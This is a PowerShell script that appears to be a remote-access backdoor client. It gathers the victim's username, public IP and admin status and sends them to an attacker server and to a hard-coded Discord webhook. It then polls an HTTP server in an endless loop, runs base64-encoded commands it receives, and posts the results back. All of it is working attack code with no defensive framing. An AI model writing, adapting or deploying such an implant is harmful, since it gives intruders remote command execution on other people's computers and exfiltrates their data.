$sendserver = "192.168.2.27:4444"
$httpserver = "192.167.2.27:80"

$webhookUri = 'https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL1gyLZM1KLJK0BuQLkMQVk7CCNA0d6hcurPmMHo-spwPpdDyoZycb0Gah'

$ran = Get-Random

$lll = "clients"

$b64string = "Y2xpZW50cw=="

$c = $null

$clients = whoami

$clients += " "

$clients += (Invoke-WebRequest ifconfig.me/ip).Content.Trim()

$body = $null

$notification = "all data image related will be sent here"

# ~~~

$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
    $check = "we are not admin"
}else{
    $check = "we are admin"
}

# attempt to send new client data to http server
try 
{
    $welcomeclient = Invoke-WebRequest -Method Post -URI $sendserver -Body $check,$ran -UseBasicParsing
}
catch
{

    Write-Output "Server isnt active."
}

$cb = $check,$ran,$notification

# send new client to discord server

foreach ($item in $cb) {
    $body += "$item`n"
    }

$jsonBody = @{
    'username' = $ran
    'content' = $body
}

    $jsonBody = $jsonBody | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUri -Method 'post' -ContentType 'application/json' -Body $jsonBody

while ($true)
{

    # try endlessly...
    $MAIN = Invoke-WebRequest -Timeout 1 $httpserver | Select-Object -Expand Content

    # if the http content corresponds to the random string, do the following...

    if($MAIN -match $ran){
        
        # take $REM and replace the $ran value to null
        $REM = $MAIN -replace $ran, ""

        $encodedBytes = [System.Convert]::FromBase64String($REM)
        $StringOutput = [System.Text.Encoding]::UTF8.GetString($encodedBytes)

        # take $REM variable and run it as a string
        $EXE = Powershell /c $StringOutput

        try
        { 
            # send back results back to server
            $Response = Invoke-WebRequest -Method Post -URI $sendserver -Body $EXE -UseBasicParsing 
        }
        catch{
            Write-Output "web server isnt running..."
        }
    }

    if($MAIN -match $b64string){
        try
        {
            $Response = Invoke-WebRequest -Method Post -URI $sendserver -Body $clients -UseBasicParsing
        sleep 10
        }
        catch{
            Write-Output "web server isnt running..."
        }
    } 
sleep 0.5
}
